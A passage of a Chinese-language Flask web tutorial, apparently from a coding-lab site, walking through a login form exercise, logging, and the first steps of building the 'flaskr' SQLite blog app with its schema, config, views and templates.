class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&amp;#123;% extends "base.html" %&amp;#125;</span><br><span class="line">&amp;#123;% block body %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &amp;#123;% if error %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">error</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>Error:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span> &amp;#123;&amp;#123; error &amp;#125;&amp;#125;</span><br><span class="line">  &amp;#123;% endif %&amp;#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span> <span class="attr">value</span>=<span class="string">"&amp;#123;&amp;#123;</span></span></span><br><span class="line"><span class="tag"><span class="string">          request.form.username &amp;#125;&amp;#125;"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span><br><span class="line">      <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">&amp;#123;% endblock %&amp;#125;</span><br></pre></td></tr></table></figure></p><p>按照前面的方式运行程序：</p><p>当访问首页 <a href="http://127.0.0.1:5000，会提示" target="_blank" rel="noopener">http://127.0.0.1:5000，会提示</a> Do you want to log in?，点击链接跳转到登录页面。</p><p>在登录页面 <a href="http://127.0.0.1:5000/login，输入用户名和密码，如果输入错误的信息比如两个都为" target="_blank" rel="noopener">http://127.0.0.1:5000/login，输入用户名和密码，如果输入错误的信息比如两个都为</a> shiyanlou，点击 Login，就会出现错误提示 Error: Invalid credentials。如果用户名输入 admin、密码输入 secret，点击 Login，就会跳转到首页，同时在首页会显示 flash 消息 You were successfully logged in。</p><h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>有时候你会遇到一种情况：理论上来说你处理的数据应该是正确的，然而实际上并不正确的状况。比如你可能有一些客户端代码，代码向服务器发送一个 HTTP 请求但是显然它是错误的。这可能是由于用户篡改数据，或客户端代码失败。大部分时候针对这一情况返回400 Bad Request就可以了，但是有时候不能这样做，代码必须继续工作。</p><p>你也有可能想要记录一些发生的不正常事情。这时候日志就派上用处。从 Flask 0.3 开始日志记录是预先配置好的。</p><p>这里有一些日志调用的例子:</p><p>app.logger.debug(‘A value for debugging’)<br>app.logger.warning(‘A warning occurred (%d apples)’, 42)<br>app.logger.error(‘An error occurred’)<br>附带的 logger 是一个标准的日志类 Logger ，因此更多的信息请查阅官方文档 logging documentation。</p><p>整合 WSGI 中间件<br>如果你想给你的应用添加 WSGI 中间件，你可以封装内部 WSGI 应用。例如如果你想使用 Werkzeug 包中的某个中间件来应付 lighttpd 中的 bugs，你可以这样做:</p><p>from werkzeug.contrib.fixers import LighttpdCGIRootFix<br>app.wsgi_app = LighttpdCGIRootFix(app.wsgi_app)</p><h2 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h2><p>请实现一个完整的用户登录功能:</p><p>当访问地址 <a href="http://127.0.0.1:5000/login" target="_blank" rel="noopener">http://127.0.0.1:5000/login</a> ，出现登录页面，可以使用用户名和密码填写登录表单。<br>如果用户名和密码都为shiyanlou，那么就把用户名数据放到session中，把地址重定向到首页显示Hello shiyanlou，同时闪现消息 you were logged in。<br>如果用户名和密码不对，依然把地址重定向到首页显示hello world，同时闪现消息 username or password invalid。<br>参考答案<br>文件目录结构如下所示：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/app.py</span></span><br><span class="line"><span class="string">/templates</span></span><br><span class="line">    <span class="string">/index.html</span></span><br><span class="line">    <span class="string">/login.html</span></span><br></pre></td></tr></table></figure></p><p>在 app.py 文件中添加如下代码：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> flash, redirect, url_for, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">b'_5#y2L"F4Q8z\n\xec]/'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,name=name)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != <span class="string">'shiyanlou'</span> <span class="keyword">or</span> request.form[<span class="string">'password'</span>] != <span class="string">'shiyanlou'</span>:</span><br><span class="line">            flash(<span class="string">'username or password invalid'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, name=<span class="string">'world'</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'username'</span>] = request.form[<span class="string">'username'</span>]</span><br><span class="line">            name = request.form[<span class="string">'username'</span>]</span><br><span class="line">            flash(<span class="string">'you were logged in'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, name=name))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br></pre></td></tr></table></figure></p><p>在 templates/index.html 文件中添加如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Index<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    &amp;#123;% for message in get_flashed_messages() %&amp;#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">flash</span>&gt;</span>&amp;#123;&amp;#123; message &amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &amp;#123;% endfor %&amp;#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>hello &amp;#123;&amp;#123;name&amp;#125;&amp;#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>在 templates/login.html 文件中添加如下代码：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&amp;#123;&amp;#123; url_for('login') &amp;#125;&amp;#125;"</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Username:</span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">text</span> <span class="attr">name</span>=<span class="string">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dt</span>&gt;</span>Password:</span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">password</span> <span class="attr">name</span>=<span class="string">password</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">dd</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">submit</span> <span class="attr">value</span>=<span class="string">Login</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="Flask项目实战之博客开发（一）"><a href="#Flask项目实战之博客开发（一）" class="headerlink" title="Flask项目实战之博客开发（一）"></a>Flask项目实战之博客开发（一）</h1><p>实验源码：<br>wget <a href="http://labfile.oss.aliyuncs.com/courses/29/flaskr.zip" target="_blank" rel="noopener">http://labfile.oss.aliyuncs.com/courses/29/flaskr.zip</a><br>unzip flaskr.zip<br>实验代码建议统一存放在 /home/shiyanlou/Code 目录下。<br>这里我们将博客应用起名为flaskr，也可以取一个不那么 web 2.0 的名字。基本上我们想要它做如下的事情：</p><p>根据配置文件中的认证允许用户登录以及注销。仅仅支持一个用户。<br>当用户登录后，他们可以添加新的条目，这些条目是由纯文本的标题和 HTML 的正文构成。因为我们信任用户这里的 HTML 是安全的。<br>页面倒序显示所有条目（新的条目在前），并且用户登入后可以在此添加新条目。<br>我们将在这个应用中直接使用 SQLite 3 因为它足够应付这种规模的应用。对更大的应用使用 SQLAlchemy 是十分有意义的，它以一种更智能方式处理数据库连接，允许你一次连接多个不同的关系数据库。你也可以考虑流行的 NoSQL 数据库，前提是你的数据更适合它们。</p><p>这是最终应用的一个截图:</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1cyxv45i1j30qa0eb76c.jpg" alt=""></p><p>在开始之前，让我们为这个应用创建需要的文件夹:<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">/flaskr</span></span><br><span class="line">    <span class="string">/static</span></span><br><span class="line">    <span class="string">/templates</span></span><br></pre></td></tr></table></figure></p><p>flaskr：项目总文件夹。其中会存放数据库代码文件 schema.sql 和 主代码文件 flaskr.py。<br>static：项目的资源文件。用于存放 css 和 javascript 文件。<br>templates：项目前端页面文件。用于存放前端页面模板。</p><h2 id="数据库模式"><a href="#数据库模式" class="headerlink" title="数据库模式"></a>数据库模式</h2><p>首先我们要创建数据库模式。对于这个应用仅一张表就足够了，而且我们只想支持 SQLite ，所以很简单。在 Code/flaskr 目录下新建 schema.sql 文件并向其中写入如下代码：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> entries;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> entries (</span><br><span class="line">  <span class="keyword">id</span> <span class="built_in">integer</span> primary <span class="keyword">key</span> autoincrement,</span><br><span class="line">  title <span class="keyword">string</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">  <span class="built_in">text</span> <span class="keyword">string</span> <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>这个模式由一个称为entries的单表构成，在这个表中每行包含一个id，一个title和一个text。id是一个自增的整数而且是主键，其余两个为非空的字符串。</p><h2 id="应用代码"><a href="#应用代码" class="headerlink" title="应用代码"></a>应用代码</h2><p>现在我们已经有了数据库模式了，可以创建应用的模块了。</p><p>在 Code/flaskr 目录下新建 flaskr.py 文件。对于小应用，直接把配置放在主模块里，正如我们现在要做的一样，这是可行的。然而一个更干净的解决方案就是单独创建.ini或者.py文件接着加载或者导入里面的值。</p><p>在 flaskr.py 文件中写入如下代码:<br><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入所有的模块</span></span><br><span class="line">import sqlite3</span><br><span class="line">from flask import Flask, request, session, g, redirect, url_for, abort, render_template, flash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件</span></span><br><span class="line">DATABASE = '/tmp/flaskr.db'</span><br><span class="line">ENV = 'development'</span><br><span class="line">DEBUG = True</span><br><span class="line">SECRET_KEY = 'development key'</span><br><span class="line">USERNAME = 'admin'</span><br><span class="line">PASSWORD = 'default'</span><br></pre></td></tr></table></figure></p><p>，修改 flaskr.py 文件在其中配置初始化:</p><h1 id="创建应用"><a href="#创建应用" class="headerlink" title="创建应用"></a>创建应用</h1><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app<span class="selector-class">.config</span><span class="selector-class">.from_object</span>(__name__)</span><br></pre></td></tr></table></figure><p>from_object()将会寻找给定的对象(如果它是一个字符串，则会导入它)，搜寻里面定义的全部大写的变量。在我们的这种情况中，配置文件就是我们上面写的几行代码。 你也可以将他们分别存储到多个文件。</p><p>通常从配置文件中加载配置是一个好的主意。这时可以使用from_envvar()来实现，可以用它替换上面的from_object()：</p><p>app.config.from_envvar(‘FLASKR_SETTINGS’, silent=True)<br>这种方法我们可以设置一个名为FLASKR_SETTINGS的环境变量来设定一个配置文件载入后是否覆盖默认值。静默开关silent=True告诉 Flask 不去关心这个环境变量键值是否存在。</p><p>SECRET_KEY是为了保持客户端的会话安全。明智地选择该键，使得它难以猜测，最好是尽可能复杂。</p><p>DEBUG 调试标志启用或禁用交互式调试。决不让调试模式在生产系统中启动，因为它将允许用户在服务器上执行代码！</p><p>我们还添加了一个轻松地连接到指定数据库的方法，这个方法用于在请求时打开一个连接，并且在交互式 Python shell 和脚本中也能使用，这将方便后面的使用。</p><p>在 Code/flaskr.py 文件中继续添加如下代码：</p><p>def connect_db():<br>    return sqlite3.connect(app.config[‘DATABASE’])<br>最后如果我们想要把这个文件当做独立应用来运行，只需在服务器启动文件也就是 Code/flaskr.py 文件的末尾添加这一行:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.<span class="built_in">run</span>()</span><br></pre></td></tr></table></figure></p><p>如此我们便可以顺利开始运行这个应用，通过使用如下命令:<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">python3</span> flaskr.<span class="keyword">py</span></span><br><span class="line"> * Serving Flask app <span class="string">"flaskr"</span> (lazy loading)</span><br><span class="line"> * Environmen<span class="variable">t:</span> development</span><br><span class="line"> * Debug <span class="keyword">mode</span>: <span class="keyword">on</span></span><br><span class="line"> * Running <span class="keyword">on</span> http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">5000</span>/ (Press CTRL+C <span class="keyword">to</span> <span class="keyword">quit</span>)</span><br><span class="line"> * Restarting with stat</span><br><span class="line"> * Debugger <span class="keyword">is</span> active!</span><br><span class="line"> * Debugger PIN: <span class="number">289</span>-<span class="number">075</span>-<span class="number">564</span></span><br></pre></td></tr></table></figure></p><p>你将会看到一个信息，信息提示你服务器启动的地址，这个地址你能够访问到的。</p><p>当你在浏览器中访问服务器获得一个 404 Not Found 的错误时，是因为我们还没有任何视图。我们之后再来关注这些。首先应该让数据库工作起来。</p><h1 id="Flask项目实战之博客开发（二）"><a href="#Flask项目实战之博客开发（二）" class="headerlink" title="Flask项目实战之博客开发（二）"></a>Flask项目实战之博客开发（二）</h1><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><p>如前面所述，Flaskr 是一个数据库驱动的应用程序，准确地来说，Flaskr 是一个使用关系数据库系统的应用程序。这样的系统需要一个模式告诉它们如何存储信息。因此在首次启动服务器之前，创建数据库模式是很重要的。</p><p>可以通过管道把 schema.sql 作为 sqlite 3 命令的输入来创建这个模式，命令如下:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlite3 /tmp/flaskr<span class="selector-class">.db</span> &lt; schema.sql</span><br></pre></td></tr></table></figure></p><p>这种方法的缺点是需要安装 sqlite 3 命令，而且你必须提供数据库的路径，否则将报错。由于实验楼环境中没有安装 sqllite3 所以会得到报错command not found: sqlite3。</p><p>添加一个函数来对数据库进行初始化是个不错的想法。如果你想要这么做，首先必须从contextlib包中导入contextlib.closing()函数。在 Code/flaskr.py 文件中添加如下代码:<br><figure class="highlight capnproto"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> contextlib <span class="keyword">import</span> closing</span><br></pre></td></tr></table></figure></p><p>接着我们可以创建一个称为 init_db 函数，该函数用来初始化数据库。为此我们可以使用之前定义的 connect_db 函数。 只要在 Code/flaskr.py 文件中的 connect_db 函数下添加这样的函数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_db</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> closing(connect_db()) <span class="keyword">as</span> db:</span><br><span class="line">        <span class="keyword">with</span> app.open_resource(<span class="string">'schema.sql'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            db.cursor().executescript(f.read().decode())</span><br><span class="line">        db.commit()</span><br></pre></td></tr></table></figure></p><p>closing()函数允许我们在with块中保持数据库连接可用。应用对象的open_resource()方法在其方框外也支持这个功能，因此可以在with块中直接使用。这个函数从当前位置（你的flaskr 文件夹）中打开一个文件，并且允许你读取它。我们在这里用它在数据库连接上执行一个脚本。</p><p>当我们连接到数据库时会得到一个数据库连接对象（这里命名它为 db），这个对象提供给我们一个数据库指针。指针上有一个可以执行完整脚本的方法。最后我们不显式地提交更改， SQLite 3 或者其它事务数据库不会这么做。</p><p>现在可以在 Python shell 里创建数据库，导入并调用刚才的函数:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; from flaskr import init_db</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; init_db()</span><br></pre></td></tr></table></figure></p><p>注意:</p><p>如果你后面得到一个表不能找到的异常，请检查你是否调用了 init_db 函数以及你的表名是否正确 (例如： singular vs. plural)。</p><h2 id="请求数据库连接"><a href="#请求数据库连接" class="headerlink" title="请求数据库连接"></a>请求数据库连接</h2><p>现在我们知道了怎样建立数据库连接以及在脚本中使用这些连接，但是我们如何能优雅地在请求中这么做？</p><p>所有我们的函数中都需要数据库连接，因此在请求之前初始化它们，在请求结束后自动关闭它们就很有意义。</p><p>Flask 允许我们使用before_request()，after_request()和 teardown_request()装饰器来实现这个功能，在 Code/flaskr.py 文件中添加如下代码:<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@app</span>.before_request</span><br><span class="line">def before_request():</span><br><span class="line">    g.db = connect_db()</span><br><span class="line"></span><br><span class="line"><span class="variable">@app</span>.teardown_request</span><br><span class="line">def teardown_request(exception):</span><br><span class="line">    g.db.close()</span><br></pre></td></tr></table></figure></p><p>使用before_request()装饰器的函数会在请求之前被调用而且不带参数。使用after_request()装饰器的函数会在请求之后被调用且传入将要发给客户端的响应。</p><p>它们必须返回那个响应对象或是不同的响应对象。但当异常抛出时，它们不一定会被执行，这时可以使用teardown_request()装饰器。它装饰的函数将在响应构造后执行，并不允许修改请求，返回的值会被忽略。如果在请求已经被处理的时候抛出异常，它会被传递到每个函数，否则会传入一个None。</p><p>我们把当前的数据库连接保存在 Flask 提供的 g 特殊对象中。这个对象只能保存一次请求的信息，并且在每个函数里都可用。不要用其它对象来保存信息，因为在多线程环境下将不可行。特殊的对象 g 在后台有一些神奇的机制来保证它在做正确的事情。</p><h1 id="Flask项目实战之博客开发（三）"><a href="#Flask项目实战之博客开发（三）" class="headerlink" title="Flask项目实战之博客开发（三）"></a>Flask项目实战之博客开发（三）</h1><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><h3 id="显示条目"><a href="#显示条目" class="headerlink" title="显示条目"></a>显示条目</h3><p>这个视图显示所有存储在数据库中的条目。它监听着应用的根地址以及将会从数据库中查询标题和内容。id值最大的条目（最新的条目）将在最前面。从游标返回的行是按select语句中声明的列组织的元组。对于像我们这样的小应用是足够的，但是你可能要把它们转换成字典，如果你对如何转换成字典感兴趣的话，请查阅简化查询例子。</p><p>视图函数将会把条目作为字典传入show_entries.html 模板并返回渲染结果。</p><p>在 flaskr/flaskr.py 文件中添加如下代码:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_entries</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    cur = g.db.execute(<span class="string">'select title, text from entries order by id desc'</span>)    查询语句</span><br><span class="line">    entries = [dict(title=row[<span class="number">0</span>], text=row[<span class="number">1</span>]) <span class="keyword">for</span> row <span class="keyword">in</span> cur.fetchall()]    将查询结果转换为字典</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'show_entries.html'</span>, entries=entries)</span><br></pre></td></tr></table></figure></p><h3 id="添加条目"><a href="#添加条目" class="headerlink" title="添加条目"></a>添加条目</h3><p>这个视图允许登录的用户添加新的条目。它只回应POST请求，实际的表单是显示在show_entries页面。如果正常工作的话，我们用flash()向下一个请求闪现一条信息并且跳转回show_entries页面。</p><p>在 flaskr/flaskr.py 文件中添加如下代码:</p><p>@app.route(‘/add’, methods=[‘POST’])<br>def add_entry():<br>    if not session.get(‘logged_in’):<br>        abort(401)<br>    g.db.execute(‘insert into entries (title, text) values (?, ?)’,[request.form[‘title’], request.form[‘text’]])   # 向数据库中插入数据<br>    g.db.commit()   # 更新数据<br>    flash(‘New entry was successfully posted’)   # 闪现一条消息<br>    return redirect(url_for(‘show_entries’))<br>注意我们这里检查用户登录情况(logged_in键存在会话中，并且为True)。向 SQL 语句中传递参数，需要在语句中使用问号?来代替参数，并把参数放在列表中进行传递。不要使用字符串格式化的方式直接把参数传入 SQL 语句中，这样可能会有潜在的 SQL 注入风险。</p><h3 id="登入和注销"><a href="#登入和注销" class="headerlink" title="登入和注销"></a>登入和注销</h3><p>这些函数是用于用户登录以及注销。登录时依据在配置中的值检查用户名和密码并且在会话中设置logged_in键值。如果用户成功登录，logged_in键值被设置成True，并跳转回show_entries页面。此外，会有消息闪现来提示用户登录成功。</p><p>如果发生错误，模板会通知，并提示重新登录。在 flaskr/flaskr.py 文件中添加如下代码:<br><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/login'</span>, methods=[<span class="string">'GET'</span>, <span class="string">'POST'</span>])</span><br><span class="line">def login():</span><br><span class="line">    <span class="built_in">error</span> = None</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> request.form[<span class="string">'username'</span>] != app.<span class="built_in">config</span>[<span class="string">'USERNAME'</span>]:    如果用户名不符合</span><br><span class="line">            <span class="built_in">error</span> = <span class="string">'Invalid username'</span></span><br><span class="line">        elif request.form[<span class="string">'password'</span>] != app.<span class="built_in">config</span>[<span class="string">'PASSWORD'</span>]:    如果密码不符合</span><br><span class="line">            <span class="built_in">error</span> = <span class="string">'Invalid password'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            session[<span class="string">'logged_in'</span>] = True    成功登录，在 session 中添加一个 logged_in 值为 True</span><br><span class="line">            flash(<span class="string">'You were logged in'</span>)    闪现一条消息</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'show_entries'</span>))    重定向到首页</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, <span class="built_in">error</span>=<span class="built_in">error</span>)    如果没有成功登录则返回登录页面以及错误信息</span><br></pre></td></tr></table></figure></p><p>另一方面，注销函数从会话中移除了logged_in键值。这里我们使用一个大绝招：<br>如果你使用字典的pop()方法并传入第二个参数（默认），这个方法会从字典中删除这个键，如果这个键不存在则什么都不做。这很有用，因为我们不需要检查用户是否已经登入。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">'/logout'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span></span><span class="symbol">:</span></span><br><span class="line">    session.pop(<span class="string">'logged_in'</span>, None)    移除 logged_in 键</span><br><span class="line">    flash(<span class="string">'You were logged out'</span>)    闪现消息</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'show_entries'</span>))    重定向到首页</span><br></pre></td></tr></table></figure></p><h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>现在我们应该开始编写模板。如果我们现在请求 URLs ，将会得到一个 Flask 无法找到模板的异常。模板使用 Jinja2 语言以及默认开启自动转义。这就意味着除非你使用Markup标记或在模板中使用|safe过滤器，否则 Jinja2 会确保特殊字符比如&lt;或&gt;被转义成等价的XML实体。</p><p>我们使用模板继承使得在网站的所有页面中重用布局成为可能。</p><p>我们的模板统一存放在Code/flaskr/templates文件夹中。</p><h3 id="layout-html"><a href="#layout-html" class="headerlink" title="layout.html"></a>layout.html</h3><p>这个模板包含 HTML 主体结构，标题和一个登录链接（或者当用户已登录则提供注销）。如果有闪现信息的话它也将显示闪现信息。&#123;% block body %&#125; 块能够被子模板中的同样名字(body)的块替代。</p><p>session字典在模板中同样可用的，你能用它检查用户是否登录。注意在 Jinja 中你可以访问不存在的对象/字典属性或成员，如同下面的代码，即便 logged_in 键不存在，仍然可以正常工作。</p><p>在 flaskr/templates 目录下新建 layout.html 文件并写入如下代码：<br><figure class="highlight xml"><table><tr><td 